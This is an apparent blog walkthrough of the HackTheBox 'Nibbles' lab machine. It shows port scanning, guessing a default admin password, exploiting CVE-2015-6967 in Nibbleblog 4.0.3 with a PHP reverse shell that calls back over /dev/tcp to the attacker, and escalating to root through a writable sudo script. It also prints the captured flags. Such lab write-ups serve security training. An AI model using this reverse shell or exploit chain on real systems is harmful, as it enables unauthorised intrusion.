---
title: HackTheBox - Nibbles
date: 2020-12-23 23:37:00 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, nibbleblog, default credentials, CVE-2015-6967, metasploit, meterpreter, reverse-shell, sudo weak configuration, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/nibbles.png
---

## Foothold

### `nmap` scan (open ports)

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Nibbles-full-port-scan.txt 10.10.10.75
Warning: 10.10.10.75 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.75
Host is up (0.096s latency).
Not shown: 65508 closed ports
PORT      STATE    SERVICE    VERSION
22/tcp    open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp    open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
4418/tcp  filtered axysbridge
```

### Apache/4.18 (port 80)

By inspecting the sources on port 80, we see there is a hidden directory `/nibbleblog/`:

![view-source-hidden-dir](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/view-source-hidden-dir.png)

Once we wo to his "hidden" directory we see that is qa website powered by [**Nibbleblog**](http://www.nibbleblog.com/), which turns out to be an open source CMS for blogs: 

![nibbleblog](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/nibbleblog.png)

While I was navigating on the website, I encountered the following error:

![XML error](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/XML-error.png)

Maybe there is something to do with it, but let's continue our enumeration.

#### Nibbleblog

Since I'm looking for more information, I ran `dirb` on [http://10.10.10.75/nibbleblog/](http://10.10.10.75/nibbleblog/):

![dirb](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/dirb.png)

On [http://10.10.10.75/nibbleblog/README](http://10.10.10.75/nibbleblog/README), we get the version number (`v4.0.3`) of **Nibbleblog**:

![version](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/version.png)

Bibbidi-Bobbidi-Boo...there is an exploit available!

![searchsploit](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/searchsploit.png)

But it requires credentials so we have to go further:

![exploit-options](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/exploit-options.png)

#### Credentials

I made a quick search &rarr; _"nibbleblog default credentials"_. Unfortunately, I didn't find anything. \

Nevertheless, there is an admin's page: [http://10.10.10.75/nibbleblog/admin.php](http://10.10.10.75/nibbleblog/admin.php). We can try some basic username/password combinations like `admin/admin`, `root/root` or even `nibbles/nibbles`.

`admin/nibbles` worked:

![success](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/success.png)

#### Metasploit

Let's go back to the exploit:

![msf](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/msf.png)

By doing so, we have a meterpreter. That's nice, but in order to avoid this "black box" method, let's exploit the vulnerability without this tool.

#### [CVE-2015-6967](https://cvedetails.com/cve/CVE-2015-6967/) exploitation

Thanks to [https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html), we can follow the steps to perform the exploit:

![packetstorm](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/packetstorm.png)

1. Prepare our PHP reverse shell:

```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.7/1234 0>&1'");
```

2. Upload our malicious file to [http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image](http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image):

![plugins > my image](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/my_image.png)

3. Run a listener &rarr; `nc -lnvp 1234`

4. Visit [http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php](http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php). Now we have a shell:

![shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/nibbles/shell.png)

## User (nibbler)

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home
<ml/nibbleblog/content/private/plugins/my_image$ cd /home                    
nibbler@Nibbles:/home$ ls
ls
nibbler
nibbler@Nibbles:/home$ cd nibbler
cd nibbler
nibbler@Nibbles:/home/nibbler$ ls -la
ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Dec 23 15:17 user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
e598bb90bc9ff2f87b72e2083c1cb95a
nibbler@Nibbles:/home/nibbler$
```

Let's see what we can run with `sudo`:

```bash
$ sudo -l 
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

## Root

Okay so we just have to replace `/home/nibbler/personal/stuff/monitor.sh` by malicious content:

```bash
nibbler@Nibbles:/home/nibbler$ mkdir -p personal/stuff
nibbler@Nibbles:/home/nibbler$ echo "cat /root/root.txt" > /home/nibbler/personal/stuff/monitor.sh
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
b59ce6c276598083872b41d4785c3e8
```

___

## Useful links

- [CVE-2015-6967](https://cvedetails.com/cve/CVE-2015-6967/)
- [Packetstorm NibbleBlog 4.0.3 Shell Upload](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html)

